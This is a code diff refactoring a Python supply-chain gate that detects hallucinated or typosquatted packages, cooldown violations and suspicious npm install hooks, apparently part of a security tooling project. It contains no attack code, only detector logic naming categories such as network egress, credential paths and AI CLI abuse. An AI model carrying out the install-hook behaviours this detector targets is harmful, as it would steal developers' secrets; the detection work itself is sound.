@@ -27,32 +27,13 @@ import gate_result  # noqa: E402  閘門結果與自產 SARIF 骨架只有一份
 from g1_manifests import REQUIREMENTS_RE, classify, parse_manifest, pep508  # noqa: E402  清單與鎖定檔解析，與 g1_sbom 共用（#262）
 from g1_registry import HttpRegistry, NotFound, Unavailable, Unknown, canon, valid_name  # noqa: E402  套件登錄庫接縫與各 registry 的名稱規則（#264）
 from g1_git import GitFailure, SubprocessGit, head_commit  # noqa: E402  Git 接縫：暫存區、追蹤檔、ref 上的內容（#265）
-CFG_DIR = ROOT / "config" / "slopsquat"
-WORKERS = 8                                        # registry 並行查詢數
-TARGET = ROOT                                      # 被掃描的專案根目錄；--target 改寫
+from g1_screen import Env, Request, build_env, discover, external_target, is_rule_file, load_yaml, rel_path, resolve, resolve_scope  # noqa: E402  範圍解析與 Env（#266）：這個檔沒有模組層的可變狀態
+from g1_screen import mapping as _mapping  # noqa: E402
 
-def external_target():
-    """目標不是本 repo：判斷交給 Policy.is_this_repo（與例外是否套用同一份條件；CI 以 VIBESEC_PROJECT_ROOT 指出受驗樹）。"""
-    return not _policy().is_this_repo(TARGET)
+def read_vibesec(env):
+    return _mapping(load_yaml(env.vibesec_file))
 
-VIBESEC_FILE = ROOT / "vibesec.yaml"
-
-def load_yaml(p: Path):
-    """讀 YAML；缺席、無法解析或缺 PyYAML 都回 None（呼叫端退回預設值）。
-    會讓檢查變寬鬆的設定是否讀得到，由 config_problems() 另外檢查並記 incomplete。"""
-    try:
-        import yaml
-        return yaml.safe_load(p.read_text()) if p.exists() else None
-    except Exception:
-        return None
-
-def _mapping(x):
-    return x if isinstance(x, dict) else {}
-
-def read_vibesec():
-    return _mapping(load_yaml(VIBESEC_FILE))
-
-def config_problems():
+def config_problems(env):
     """缺席或壞掉就會讓 G1 變寬鬆的設定（門檻退回內建值、安裝腳本樣式／黑名單／熱門清單變空）：
     回傳未完成原因（incomplete ≠ pass，AGENTS.md #2）。allowlist.yaml 與 blocking-policy 的例外壞掉只會更嚴，不在此列。"""
     out = []
@@ -61,7 +42,7 @@ def config_problems():
     except Exception as e:
         return [f"G1 設定無法讀取：缺 PyYAML（{type(e).__name__}），門檻、黑名單與安裝腳本樣式都無法載入"]
     shown = lambda p: Path(p).resolve().relative_to(ROOT).as_posix() if Path(p).resolve().is_relative_to(ROOT) else str(p)
-    for p, kinds in ((VIBESEC_FILE, (dict,)), (CFG_DIR / "cooldown.yaml", (dict,)), (CFG_DIR / "blacklist.yaml", (dict, list))):
+    for p, kinds in ((env.vibesec_file, (dict,)), (env.config_dir / "cooldown.yaml", (dict,)), (env.config_dir / "blacklist.yaml", (dict, list))):
         try:
             data = yaml.safe_load(p.read_text(encoding="utf-8"))
         except FileNotFoundError:
@@ -71,19 +52,19 @@ def config_problems():
         if not isinstance(data, kinds):
             out.append(f"G1 設定 {shown(p)} 格式不符（最上層為 {type(data).__name__}）")
     for name in ("popular-npm.txt", "popular-pypi.txt"):
-        p = CFG_DIR / name
+        p = env.config_dir / name
         try:
             p.read_text(encoding="utf-8")
         except Exception as e:
             out.append(f"G1 設定 {shown(p)} " + ("缺席" if isinstance(e, FileNotFoundError) else f"無法讀取（{type(e).__name__}）"))
     return out
 
-def cfg():
+def cfg(env):
     """vibesec.yaml 優先，cooldown.yaml 補細節（檔頭約定）。cooldown.yaml 的門檻在 thresholds、相似度在 similarity 之下；
     以前讀頂層的 similarity_ratio（不存在）而一律用 0.80，與文件寫的 difflib_ratio_min 0.85 不一致。"""
-    c = _mapping(load_yaml(CFG_DIR / "cooldown.yaml"))
+    c = _mapping(load_yaml(env.config_dir / "cooldown.yaml"))
     th, sim = c.get("thresholds") or {}, c.get("similarity") or {}
-    vb = read_vibesec()
+    vb = read_vibesec(env)
     g1 = ((vb.get("gates") or {}).get("g1_supply_chain") or {})
     return {
         "cooldown_days": g1.get("cooldown_days", th.get("cooldown_days", 14)),
@@ -93,8 +74,8 @@ def cfg():
         "min_name_length": sim.get("min_name_length", 4),
     }
 
-def load_popular(name):
-    p = CFG_DIR / name
+def load_popular(env, name):
+    p = env.config_dir / name
     if not p.exists():
         return set()
     return {l.strip().lower() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")}
@@ -110,12 +91,12 @@ def _defang(name):
     刻意不併進 canon()：canon 用於完全比對與去重，若在那裡折疊，paypa1 會被當成 paypal 而放行（放錯方向）。"""
     return re.sub(r"[-_.]+", "", name.translate(_CONFUSABLE))
 
-def load_list(name):
+def load_list(env, name):
     """讀 blacklist（allowlist 用 load_allowlist）：鍵為 (ecosystem, 名稱小寫)；ecosystem 缺省時記為 None（適用所有生態系）。
 
     條目名稱可用 `name`（blacklist.yaml）或 `package`（allowlist.yaml）欄位。
     """
-    data = load_yaml(CFG_DIR / name)
+    data = load_yaml(env.config_dir / name)
     data = data if isinstance(data, (dict, list)) else {}   # 型別不對由 config_problems() 記 incomplete
     items = data.get("packages", []) if isinstance(data, dict) else data
     out = {}
@@ -136,44 +117,39 @@ def lookup(entries, eco, pkg):
                 return it
     return None
 
-# 套件登錄庫接縫（#264）：登錄庫給事實，判定留在這裡。REGISTRY 是測試與評測注入替身的地方（S5 起改由 screen 的 Env 注入）；
-# 沒有指定就用生產的 HttpRegistry。npm_check／pypi_check／pypi_requires 是 S5 之前保留的注入點：快篩 selftest 的 CLI 情境靠覆寫它們。
-REGISTRY = None
-
-def _registry():
-    return REGISTRY if REGISTRY is not None else HttpRegistry()
+# 套件登錄庫接縫（#264）：登錄庫給事實，判定留在這裡。登錄庫由 Env.registry 注入（生產：HttpRegistry；測試與評測：FakeRegistry）。
 
 def _eco_label(eco):
     return "npm" if eco == "npm" else "PyPI"
 
-def check_package(registry, eco, pkg, ver, c):
+def check_package(env, eco, pkg, ver, c):
     """回傳 (findings, incomplete_reason|None)。查無此套件是正常發現（疑似幻覺／搶註）；查不到、缺資料都是未完成原因，
     不得當成通過（AGENTS.md 規則 2）。"""
     if not valid_name(eco, pkg):
         return [], f"{_eco_label(eco)} 套件名稱不合法，未查詢 registry：{pkg!r}"
-    r = registry.facts(eco, pkg, ver)
+    r = env.registry.facts(eco, pkg, ver)
     who = "npm registry" if eco == "npm" else "PyPI"
     if isinstance(r, NotFound):
-        return [fnd("vibesec.g1.hallucinated-package", pkg, eco, ver,
+        return [fnd(env, "vibesec.g1.hallucinated-package", pkg, eco, ver,
                     f"{who} 查無此套件（疑似幻覺/搶註）", "blocking", "registry_health")], None
     if isinstance(r, Unavailable):
         return [], f"{who} 查詢失敗（{pkg}）：{r.reason}"
-    return (_judge_npm if eco == "npm" else _judge_pypi)(pkg, r.facts, c)
+    return (_judge_npm if eco == "npm" else _judge_pypi)(env, pkg, r.facts, c)
 
-def _judge_npm(pkg, f, c):
+def _judge_npm(env, pkg, f, c):
     findings, gaps = [], []
     # 冷卻期與安裝 hook：鎖定版本不在發布紀錄、發布時間不明 → 這兩項沒查到，記 incomplete（以前靜默略過而 pass）
     age = age_days(f.published_at) if f.version and not isinstance(f.published_at, Unknown) else None
     if age is None:
         gaps.append("冷卻期")
     else:
-        found = cooldown_finding(pkg, "npm", f.version, age, c)
+        found = cooldown_finding(env, pkg, "npm", f.version, age, c)
         if found:
             findings.append(found)
     if f.install_scripts is None or isinstance(f.install_scripts, Unknown):
         gaps.append("安裝 hook")
     else:
-        found = install_hook_finding(pkg, "npm", f.version, f.install_scripts)
+        found = install_hook_finding(env, pkg, "npm", f.version, f.install_scripts)
         if found:
             findings.append(found)
     # 週下載：查不到就不知道信譽，記 incomplete（存在性已確認，其他發現照列）
@@ -181,40 +157,31 @@ def _judge_npm(pkg, f, c):
     if not isinstance(dl, int):
         gaps.append(f"週下載量（{dl.why if isinstance(dl, Unknown) else type(dl).__name__}）")
     elif dl < c["min_weekly_downloads"]:
-        findings.append(fnd("vibesec.g1.low-download-package", pkg, "npm", f.version,
+        findings.append(fnd(env, "vibesec.g1.low-download-package", pkg, "npm", f.version,
                             f"週下載量 {dl} < {c['min_weekly_downloads']}，信譽不足，需人工判斷", "advisory"))
     if gaps:
         return findings, f"npm {pkg}@{f.version or '?'}：{'、'.join(gaps)}未檢查（版本不在 registry 發布紀錄、發布時間不明或查詢失敗）"
     return findings, None
 
-def _judge_pypi(pkg, f, c):
+def _judge_pypi(env, pkg, f, c):
     age = age_days(f.published_at) if not isinstance(f.published_at, Unknown) else None
     if age is None:
         # 版本不在發布紀錄、該版沒有檔案或上傳時間不明：冷卻期沒查到 ≠ 通過
         return [], f"PyPI {pkg}@{f.version or '?'}：冷卻期未檢查（版本不在 PyPI 發布紀錄或發布時間不明）"
-    found = cooldown_finding(pkg, "pypi", f.version, age, c)
+    found = cooldown_finding(env, pkg, "pypi", f.version, age, c)
     return ([found] if found else []), None
 
-def npm_check(pkg, ver, c):
-    return check_package(_registry(), "npm", pkg, ver, c)
-
-def pypi_check(pkg, ver, c):
-    return check_package(_registry(), "pypi", pkg, ver, c)
-
-def pypi_requires(pkg, ver):
-    return _registry().requires(pkg, ver)
-
-def _check_job(eco, name, ver, c):
+def _check_job(env, eco, name, ver, c):
     """並行查詢的一筆。任何意外的錯誤都轉成這一筆的未完成原因，不讓整批查詢中斷（沒有證據不是通過，AGENTS.md 規則 2）。"""
     try:
-        return (npm_check if eco == "npm" else pypi_check)(name, ver, c)
+        return check_package(env, eco, name, ver, c)
     except Exception as e:
         return [], f"{_eco_label(eco)} {name}@{ver or '?'}：檢查時發生未預期的錯誤（{type(e).__name__}：{e}）"
 
-def requirements_indirect(path, requires=None):
+def requirements_indirect(env, path, requires=None):
     """requirements*.txt 中由同檔其他套件宣告為相依的 (名稱小寫, 版本)，即間接相依，不做名稱相似度。
     只看鎖定版本（==）的條目；pip-compile／uv export 產生的鎖定檔沒有直接／間接的標記，改以 PyPI 的 requires_dist 推得。"""
-    requires = requires or pypi_requires
+    requires = requires or env.registry.requires
     pins = []
     for line in Path(path).read_text(errors="ignore").splitlines():
         x = pep508(line.split(" #", 1)[0])
@@ -222,7 +189,7 @@ def requirements_indirect(path, requires=None):
             pins.append(x)
     if len(pins) < 2:
         return set()
-    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
+    with ThreadPoolExecutor(max_workers=env.workers) as ex:
         deps = list(ex.map(lambda p: requires(*p), pins))
     required_by = {}
     for (name, _), ds in zip(pins, deps):
@@ -230,18 +197,18 @@ def requirements_indirect(path, requires=None):
             required_by.setdefault(d, set()).add(canon("pypi", name))
     return {(n.lower(), v) for n, v in pins if required_by.get(canon("pypi", n))}
 
-def cooldown_finding(pkg, eco, ver, age, c):
+def cooldown_finding(env, pkg, eco, ver, age, c):
     """發布天數未滿冷卻期 → blocking；天數未知（None）不判定。純函式，run_evals.py 以合成 fixture 直接呼叫。"""
     if age is None or age >= c["cooldown_days"]:
         return None
-    return fnd("vibesec.g1.cooldown-violation", pkg, eco, ver,
+    return fnd(env, "vibesec.g1.cooldown-violation", pkg, eco, ver,
                f"版本發布僅 {age} 天，未滿冷卻期 {c['cooldown_days']} 天", "blocking")
 
-def _install_hooks_cfg():
-    return _mapping(load_yaml(CFG_DIR / "cooldown.yaml")).get("install_hooks") or {}
+def _install_hooks_cfg(env):
+    return _mapping(load_yaml(env.config_dir / "cooldown.yaml")).get("install_hooks") or {}
 
-def _hook_patterns():
-    return _install_hooks_cfg().get("suspicious_patterns") or {}
+def _hook_patterns(env):
+    return _install_hooks_cfg(env).get("suspicious_patterns") or {}
 
 # decision 條件：鍵對應 cooldown.yaml install_hooks.decision，值（block / advisory）由設定決定 tier。
 # 內建預設與設定檔現值等價：改設定檔即可調整政策（不再寫死），設定缺省時行為不變。
@@ -260,11 +227,11 @@ _DECISION_TIER = {"block": "blocking", "blocking": "blocking", "advisory": "advi
 # 預設掃描的 npm 安裝期腳本（設定缺省時用）：含 prepare（npm 安裝時也會跑，惡意 payload 可藏於此）。
 _NPM_HOOK_DEFAULT = ["preinstall", "install", "postinstall", "prepare"]
 
-def install_hook_finding(pkg, eco, ver, scripts, patterns=None, npm_scripts=None, decision=None):
+def install_hook_finding(env, pkg, eco, ver, scripts, patterns=None, npm_scripts=None, decision=None):
     """依 cooldown.yaml install_hooks 分類安裝階段 hook（docs/02 第 3 層）。
     掃描的腳本名單（npm_scripts）、各組合的 tier（decision）皆取自 cooldown.yaml，可用參數覆寫（供 selftest）。
     其餘（例如 node-gyp rebuild）不判 egress，回傳 None。純函式，run_evals.py 以合成 fixture 直接呼叫。"""
-    ih = _install_hooks_cfg() if (patterns is None or npm_scripts is None or decision is None) else {}
+    ih = _install_hooks_cfg(env) if (patterns is None or npm_scripts is None or decision is None) else {}
     pats = patterns if patterns is not None else (ih.get("suspicious_patterns") or {})
     hook_names = npm_scripts if npm_scripts is not None else (ih.get("npm_scripts") or _NPM_HOOK_DEFAULT)
     dec = decision if decision is not None else (ih.get("decision") or {})
@@ -283,9 +250,9 @@ def install_hook_finding(pkg, eco, ver, scripts, patterns=None, npm_scripts=None
         return None
     why = [k for k in ("network", "env_read", "credential_paths", "ai_cli_abuse", "exec") if hit[k]]
     if "blocking" in tiers:
-        return fnd("vibesec.g1.postinstall-egress", pkg, eco, ver,
+        return fnd(env, "vibesec.g1.postinstall-egress", pkg, eco, ver,
                    f"安裝階段 hook（{names}）命中可疑樣式：{', '.join(why)}", "blocking")
-    return fnd("vibesec.g1.postinstall-egress", pkg, eco, ver,
+    return fnd(env, "vibesec.g1.postinstall-egress", pkg, eco, ver,
                f"安裝階段 hook（{names}）含動態執行或外連，需人工審查", "advisory")
 
 def age_days(iso):
@@ -307,14 +274,14 @@ def _edit_distance(a: str, b: str) -> int:
                 d[i][j] = min(d[i][j], d[i - 2][j - 2] + 1)
     return d[-1][-1]
 
-def similarity_check(pkg, eco, popular, blacklist, c, fuzzy=True):
+def similarity_check(env, pkg, eco, popular, blacklist, c, fuzzy=True):
     """blacklist → 與熱門清單的名稱相似度（allowlist 由 apply_allowlist 逐筆發現套用）。fuzzy=False（鎖定檔中的
     間接相依）只查黑名單：間接相依的名稱由上游維護者決定、不是開發者或 AI 打出來的，存在性、冷卻期、安裝 hook 仍逐一檢查。"""
     it = lookup(blacklist, eco, pkg)
     if it:
         hint = f"；正確名稱應為 {it['looks_like']}" if it.get("looks_like") else ""
         tier = "advisory" if it.get("action") == "warn" else "blocking"
-        return fnd("vibesec.g1.hallucinated-package", pkg, eco, None,
+        return fnd(env, "vibesec.g1.hallucinated-package", pkg, eco, None,
                    f"命中黑名單（{it.get('status', '?')}）：{it.get('reason', 'known typosquat')}{hint}", tier, "blacklist")
     if not fuzzy:
         return None
@@ -327,7 +294,7 @@ def similarity_check(pkg, eco, popular, blacklist, c, fuzzy=True):
     pl_defang = _defang(pl)
     for cg, good in canon_popular.items():
         if pl != cg and pl_defang == _defang(cg):
-            return fnd("vibesec.g1.hallucinated-package", pkg, eco, None,
+            return fnd(env, "vibesec.g1.hallucinated-package", pkg, eco, None,
                        f"名稱與熱門套件 '{good}' 僅差同形字或分隔符，疑似 typosquat", "blocking", "similarity")
     for cg, good in canon_popular.items():
         ratio = difflib.SequenceMatcher(None, pl, cg).ratio()
@@ -336,7 +303,7 @@ def similarity_check(pkg, eco, popular, blacklist, c, fuzzy=True):
         # 只認 1 次編輯：短名改 2 個字母已是另一個字（zipp／pip、hpack／black、pyrit／pyjwt 都是不相干的真套件）
         if ratio >= c["similarity"] or (len(pl) >= c.get("min_name_length", 4)
                                         and 0 < dist <= (1 if len(pl) <= 5 else c.get("levenshtein_max", 2))):
-            return fnd("vibesec.g1.hallucinated-package", pkg, eco, None,
+            return fnd(env, "vibesec.g1.hallucinated-package", pkg, eco, None,
                        f"名稱與熱門套件 '{good}' 高度相似（ratio={ratio:.2f}, edit={dist}），疑似 typosquat", "blocking",
                        "similarity")
     return None
@@ -344,23 +311,14 @@ def similarity_check(pkg, eco, popular, blacklist, c, fuzzy=True):
 CHECK_OF_RULE = {"vibesec.g1.cooldown-violation": "cooldown", "vibesec.g1.low-download-package": "low_download",
                  "vibesec.g1.postinstall-egress": "install_hook"}
 
-def fnd(rule, pkg, eco, ver, reason, tier, check=None):
+def fnd(env, rule, pkg, eco, ver, reason, tier, check=None):
     # tier 只能降級（advisory 線索），不能高於 blocking-policy（scripts/vibesec_policy.py）
     # check：產生這筆發現的檢查（registry_health／blacklist／similarity／cooldown／low_download／install_hook），
     # allowlist 的 bypass 依此比對；hallucinated-package 由三種檢查產生，呼叫端必須指明
     return {"rule_id": rule, "package": pkg, "ecosystem": eco, "version": ver,
-            "reason": reason, "policy_tier": _policy().cap(rule, tier), "check": check or CHECK_OF_RULE.get(rule)}
+            "reason": reason, "policy_tier": env.policy.cap(rule, tier), "check": check or CHECK_OF_RULE.get(rule)}
 
-_POLICY = None
-def _policy():
-    global _POLICY
-    if _POLICY is None:
-        sys.path.insert(0, str(Path(__file__).resolve().parent))
-        from vibesec_policy import Policy
-        _POLICY = Policy(ROOT)
-    return _POLICY
-
-def self_install_hooks(path):
+def self_install_hooks(env, path):
     """專案自己的 package.json scripts（preinstall／postinstall…）也要查外連與讀憑證（SKILL.md 步驟 1）。"""
     p = Path(path)
     if p.name != "package.json":
@@ -372,22 +330,7 @@ def self_install_hooks(path):
     scripts = j.get("scripts") if isinstance(j, dict) else None
     if not isinstance(scripts, dict) or not scripts:
         return None
-    return install_hook_finding(f"{j.get('name') or p.name}（本專案 scripts）", "npm", str(j.get("version") or ""), scripts)
-
-def rel_path(path):
-    """manifest 路徑轉成相對目標專案根目錄的 POSIX 路徑；目標外的檔案保持原樣。"""
-    p = Path(path).resolve()
-    try:
-        return p.relative_to(TARGET.resolve()).as_posix()
-    except ValueError:
-        return Path(path).as_posix()
-
-def resolve(path):
-    """相對路徑先以目標專案為基準，找不到再以目前目錄為基準（相容 --manifest 傳入工作目錄相對路徑）。"""
-    p = Path(path)
-    if p.is_absolute() or not (TARGET / p).exists():
-        return p
-    return TARGET / p
+    return install_hook_finding(env, f"{j.get('name') or p.name}（本專案 scripts）", "npm", str(j.get("version") or ""), scripts)
 
 def apply_exceptions(finding, project):
     """命中 rule_id 與 path_glob 的例外（project：Policy.for_project 的結果）時把 blocking 降為 advisory；
@@ -445,13 +388,13 @@ def version_matches(spec, ver):
     ops = {">=": k.__ge__, "<=": k.__le__, ">": k.__gt__, "<": k.__lt__, "==": k.__eq__, "=": k.__eq__}
     return all(ops[op](v) for op, v in spec[1])
 
-def load_allowlist(path=None, today=None):
+def load_allowlist(env, path=None):
     """讀 allowlist.yaml 的 entries（舊格式 packages 也接受），只保留合規且未過期的條目（fail closed）。
 
     必填：package、approved_by、expires（YYYY-MM-DD）、reason、bypass（非空，值須在 BYPASSABLE）；
     version 可省略（所有版本）或依 parse_version_spec。回傳 (有效條目, 被忽略的條目說明)。"""
-    today = today or date.today()
-    data = load_yaml(path or CFG_DIR / "allowlist.yaml") or {}
+    today = env.today
+    data = load_yaml(path or env.config_dir / "allowlist.yaml") or {}
     items = data.get("entries", data.get("packages")) if isinstance(data, dict) else data
     valid, ignored = [], []
     for it in items or []:
@@ -498,24 +441,7 @@ def apply_allowlist(finding, entries, ver=None):
         break
     return finding
 
-# Git 接縫（#265）：GIT 是測試注入替身的地方（S5 起改由 screen 的 Env 注入）；沒有指定就用生產的 SubprocessGit，工作目錄是被掃描的目標專案。
-GIT = None
-
-def _git():
-    return GIT if GIT is not None else SubprocessGit(TARGET)
-
-# 全量掃描（--target、非 git 目錄）時略過的目錄：安裝產物與快取，不是專案宣告的相依
-SKIP_DIRS = {".git", "node_modules", ".venv", "venv", "__pycache__", ".tox", ".mypy_cache", ".pytest_cache", "dist", "build"}
-
-def discover(target, git):
-    """列出目標專案的所有 manifest 與 agent 規則檔（相對目標根目錄）。git repo 取追蹤中的檔案，否則走訪目錄。"""
-    files = git.tracked_files()
-    if files is None:
-        files = []
-        for d, dirs, names in os.walk(target):
-            dirs[:] = [x for x in dirs if x not in SKIP_DIRS]
-            files += [Path(d, n).relative_to(target).as_posix() for n in names]
-    return sorted(files)
+# Git 接縫（#265）：Git 由 Env.git 注入（生產：SubprocessGit，工作目錄是被掃描的目標專案；測試：FakeGit）。
 
 # 安裝指令中「後面接一個值」的旗標：緊接在這類旗標後的是檔案、路徑、URL 或設定值，不是套件名
 # （pip install -r requirements.txt、-e git+https://…、-i https://…）。只列文件明載需要值的旗標，以免把真正的套件漏掉。
@@ -538,42 +464,6 @@ INSTALL_RE = {
 }
 RULE_FILE_DEFAULTS = (".cursorrules", "AGENTS.md", "SKILL.md", "CLAUDE.md", ".cursor/rules/**/*.mdc", "**/*.md")
 
-_RULE_CFG = None
-def rule_cfg():
-    """(規則檔 glob 清單, 設定的安裝指令 regex 或 None)。glob 取 vibesec.yaml scan_agent_rule_files 與 cooldown.yaml
-    agent_rule_files 的聯集（只會多掃，不會少掃）；兩者都缺席時用 RULE_FILE_DEFAULTS。regex 無法編譯 → 只用內建樣式。"""
-    global _RULE_CFG
-    if _RULE_CFG is None:
-        c = _mapping(load_yaml(CFG_DIR / "cooldown.yaml"))
-        g1 = ((read_vibesec() or {}).get("gates") or {}).get("g1_supply_chain") or {}
-        globs = [str(x) for x in (g1.get("scan_agent_rule_files") or []) + (c.get("agent_rule_files") or [])]
-        try:
-            rx = re.compile(c["install_command_regex"]) if c.get("install_command_regex") else None
-        except (re.error, TypeError):
-            rx = None
-        _RULE_CFG = (list(dict.fromkeys(globs)) or list(RULE_FILE_DEFAULTS), rx)
-    return _RULE_CFG
-
-def _glob_re(pat):
-    """gitignore 式 glob → regex：** 跨目錄（**/ 可為空）、* 與 ? 不跨 /。"""
-    out, i = "", 0
-    while i < len(pat):
-        if pat.startswith("**/", i):
-            out, i = out + "(?:.*/)?", i + 3
-        elif pat.startswith("**", i):
-            out, i = out + ".*", i + 2
-        else:
-            out += {"*": "[^/]*", "?": "[^/]"}.get(pat[i], re.escape(pat[i])); i += 1
-    return re.compile(out + r"\Z")
-
-def is_rule_file(path, globs=None):
-    """不含 / 的樣式比對檔名（AGENTS.md 在任何目錄都算），含 / 的比對相對路徑（.cursor/rules/**/*.mdc）。"""
-    p = rel_path(path) if Path(path).is_absolute() else Path(path).as_posix()
-    for pat in globs if globs is not None else rule_cfg()[0]:
-        if _glob_re(pat).match(p if "/" in pat else Path(p).name):
-            return True
-    return False
-
 def _install_names(eco, flags, tokens):
     """安裝指令的旗標與其後的參數 → 套件名清單。最後一個旗標需要值（-r、-e、--index-url…）→ 名稱位置是旗標的值，整段略過。"""
     if flags and flags[-1] in VALUE_FLAGS[eco]:
@@ -591,7 +481,7 @@ def _install_names(eco, flags, tokens):
             break
     return out
 
-def rule_file_mentions(path):
+def rule_file_mentions(env, path):
     """agent 規則檔／markdown 中 `npm install X`、`pip install X`、`uv add X` 等提及的套件（不含 `from X import`：模組名不等於套件名）。"""
     try:
         text = Path(path).read_text(errors="ignore")
@@ -603,7 +493,7 @@ def rule_file_mentions(path):
             line_end = text.find("\n", m.end())
             rest = text[m.end():line_end if line_end >= 0 else len(text)]
             out += [(eco, n, None) for n in _install_names(eco, m.group(1).split(), [m.group(2)] + rest.split())]
-    rx = rule_cfg()[1]
+    rx = env.rule_cfg[1]
     # 設定的 regex：具名群組 pypi／npm 優先，否則依 cooldown.yaml 的寫法，第 1 群組是 Python、第 2 群組是 npm 的參數
     groups = [(g, eco) for g, eco in (("pypi", "pypi"), ("npm", "npm")) if rx is not None and g in rx.groupindex] \
         or [(i, eco) for i, eco in ((1, "pypi"), (2, "npm")) if rx is not None and rx.groups >= i]
@@ -628,23 +518,23 @@ def _install_token_name(eco, tok):
         tok = re.split(r'[=<>!~\[]', tok, maxsplit=1)[0]
     return tok if NAME_RE[eco].match(tok) else None
 
-def _entries(path):
+def _entries(root, path):
     """清單 → [(eco, name, version)]。無法驗證的條目與無解析器的檔由 main 另外用 parse_manifest 取得並回報，這裡只要套件。"""
-    return [(d.eco, d.name, d.version) for d in parse_manifest([path], root=TARGET).entries]
+    return [(d.eco, d.name, d.version) for d in parse_manifest([path], root=root).entries]
 
-def added_packages(path, base, git):
+def added_packages(root, path, base, git):
     """diff-aware：只回傳相對 base 新增或改版的 (eco, name, version)。base 為 None 時回傳全部。"""
-    head = _entries(path)
+    head = _entries(root, path)
     if not base:
         return head
-    old_text = git.show(base, rel_path(path))
+    old_text = git.show(base, rel_path(root, path))
     if old_text is None:
         return head
     import tempfile
     with tempfile.TemporaryDirectory() as d:
         old = Path(d) / Path(path).name
         old.write_text(old_text)
-        before = {(e, n.lower(), v) for e, n, v in _entries(old)}
+        before = {(e, n.lower(), v) for e, n, v in _entries(root, old)}
     return [(e, n, v) for e, n, v in head if (e, n.lower(), v) not in before]
 
 def _escape_surrogate(ch):
@@ -747,22 +637,22 @@ def gate_status(findings, incomplete, coverage, notes=()):
     return verdict(blocking=sum(f["policy_tier"] == "blocking" for f in findings), coverage=coverage,
                    problems=list(dict.fromkeys(incomplete)), notes=list(notes))
 
-def gate_run(started, base, scope, commit=None):
+def gate_run(started, base, scope, commit=None, *, mode=None, config_root=ROOT):
     """G1 的閘門執行（gate_result.GateRun）：SBOM 與 KEV 由 g1_sbom.py、g1_kev.py 併入（依 control_id 取代），
     宣告為 deferred（清單直接取自 gate_verdict.REQUIRED_CONTROLS，不另外維護）；沒併入就維持 pending，最終判定視同未實測。
-    mode 取自政策（_POLICY.mode，#200）：mode 缺席或不合法時 load_policy 回報政策讀不到，main() 在執行任何檢查之前就以
+    mode 取自政策（Env.policy.mode，#200）：mode 缺席或不合法時 load_policy 回報政策讀不到，main() 在執行任何檢查之前就以
     unreadable() 結束（政策不在 → mode None，unreadable() 記 enforce）。"""
     from gate_verdict import REQUIRED_CONTROLS
-    vb = read_vibesec() or {}
-    return gate_result.GateRun("G1", controls=CONTROLS, deferred=REQUIRED_CONTROLS["G1"], mode=_POLICY.mode if _POLICY is not None else None, scope=scope,
+    vb = _mapping(load_yaml(config_root / "vibesec.yaml"))
+    return gate_result.GateRun("G1", controls=CONTROLS, deferred=REQUIRED_CONTROLS["G1"], mode=mode, scope=scope,
                    commit=commit, diff_base=base, risk_tier=vb.get("risk_tier", "L2"), started_at=started)
 
-def write_unreadable_gate(path, problem, started, base, scope, commit=None):
+def write_unreadable_gate(path, problem, started, base, scope, commit=None, config_root=ROOT):
     """政策檔讀不到：slopcheck 沒有執行 → 三個控制 untested（原因＝problem）、SBOM／KEV pending、tool 列只有一列 error。"""
-    _write_json(path, gate_run(started, base, scope, commit).unreadable(problem, tool_name=TOOL_NAME, version=TOOL_VERSION))
+    _write_json(path, gate_run(started, base, scope, commit, config_root=config_root).unreadable(problem, tool_name=TOOL_NAME, version=TOOL_VERSION))
 
-def write_gate(path, findings, incomplete, started, base, scope, sarif_ref, notes=(), pypi_checked=0, commit=None):
-    run = gate_run(started, base, scope, commit)
+def write_gate(env, path, findings, incomplete, started, base, scope, sarif_ref, notes=(), pypi_checked=0, commit=None):
+    run = gate_run(started, base, scope, commit, mode=env.policy.mode, config_root=env.config_root)
     run.tool(TOOL_NAME, "ran", version=TOOL_VERSION, output_ref=sarif_ref)
     for c in gate_coverage(findings, incomplete, pypi_checked):
         run.cover(c["control_id"], c["state"], c["reason"])
@@ -786,25 +676,51 @@ def selftest():
     """離線自我測試 --target：registry 查詢以替身取代，只驗證路徑、全量探索、鎖定檔與例外範圍。"""
     import contextlib, io, shutil, tempfile
     from jsonschema import Draft202012Validator
-    global TARGET, npm_check, pypi_check, pypi_requires, load_allowlist, _RULE_CFG, _POLICY
-    global CFG_DIR, VIBESEC_FILE
+    import dataclasses
+    from g1_registry import Facts, Found
     fails = []
     schema = Draft202012Validator(json.loads((ROOT / "schemas/gate-result.schema.json").read_text(encoding="utf-8")))
-    real = (npm_check, pypi_check, pypi_requires, load_allowlist, _policy())
-    real_allowlist = load_allowlist
-    allow = []                                  # 整合測試用的合成 allowlist（不依賴政策檔現有條目與到期日）
-    load_allowlist = lambda path=None, today=None: (list(allow), [])
-    calls = []
-    def stub(pkg, ver, c):
-        calls.append((pkg, ver))
-        return [fnd("vibesec.g1.cooldown-violation", pkg, "pypi", ver, "selftest 替身", "blocking")], None
-    npm_check = pypi_check = stub
+    calls = []                                  # 替身登錄庫收到的查詢 (名稱, 版本)
     requires_of = {}                            # 合成的 PyPI requires_dist（名稱小寫 → 相依名稱）
-    pypi_requires = lambda pkg, ver: set(requires_of.get(pkg.lower(), ()))
-    # 合成例外（不依賴政策檔現有例外與其到期日）：暫存 root 放本 repo 政策的副本，只換掉 exceptions；
-    # G1 經 Policy(暫存 root) 讀例外，暫存 root 就是「本 repo」（例外照常套用），其他目標都是外部專案
+    boom = set()                                # 查詢這些套件時丟出意外的錯誤（#264）
+
+    class StubRegistry:
+        """對任何套件都回「剛發布」的事實：冷卻期未滿 → 一筆 blocking 的 cooldown-violation；記錄每一次查詢。"""
+        def facts(self, eco, name, ver):
+            calls.append((name, ver))
+            if name in boom:
+                raise RuntimeError("selftest 意外")
+            npm = eco == "npm"
+            return Found(Facts(eco, name, ver or "0.0.1", datetime.now(timezone.utc).isoformat(), {} if npm else None, 10 ** 6 if npm else None))
+
+        def requires(self, name, ver):
+            return set(requires_of.get(name.lower(), ()))
+
+    class CleanRegistry:
+        """對任何套件都回「發布很久、沒有安裝腳本、下載量高」的事實：沒有任何發現、沒有未完成原因；queried 記錄查詢的名稱。"""
+        def __init__(self):
+            self.queried = []
+
+        def facts(self, eco, name, ver):
+            self.queried.append(name)
+            npm = eco == "npm"
+            return Found(Facts(eco, name, ver or "1.0.0", "2020-01-01T00:00:00Z", {} if npm else None, 10 ** 6 if npm else None))
+
+        def requires(self, name, ver):
+            return set()
+
     import yaml
     from vibesec_policy import Policy
